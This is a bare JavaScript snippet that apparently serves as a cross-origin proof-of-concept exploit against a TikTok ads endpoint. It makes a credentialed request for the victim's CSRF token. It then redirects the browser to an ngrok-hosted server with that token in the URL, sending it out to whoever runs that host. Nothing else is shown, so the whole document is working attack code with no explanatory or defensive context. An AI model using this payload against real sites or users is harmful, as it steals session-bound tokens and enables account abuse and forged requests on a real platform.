var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://ads.tiktok.com/passport/safe/csrf_token/?aid=1583");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
